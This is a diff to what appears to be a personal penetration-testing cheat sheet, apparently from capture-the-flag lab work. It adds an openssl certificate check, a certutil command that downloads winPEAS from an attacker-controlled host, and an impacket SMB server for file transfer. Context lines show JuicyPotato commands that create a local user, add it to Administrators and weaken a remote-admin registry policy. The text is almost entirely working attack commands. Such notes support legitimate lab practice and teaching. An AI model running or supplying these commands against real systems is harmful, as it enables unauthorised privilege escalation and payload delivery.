@@ -1,5 +1,12 @@
 # OWASP Top 10
 
+## SSL Certificates
+
+```shell
+# Inspect SSL certificates
+openssl s_client -connect 10.10.10.250:443
+````
+
 ## Command Injection
 
 ### Ask Jeeves
@@ -63,6 +70,24 @@ JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
 JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
 JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 ```
+
+------------------------------------------------------------------------------------------------------
+
+# File Transfers
+
+## Windows
+
+```powershell
+certutil.exe -f -urlcache -split http://10.10.10.10/winPease.exe winPease.exe
+```
+
+## Impackets
+
+```command
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+
+------------------------------------------------------------------------------------------------------
 
 # Extra
 
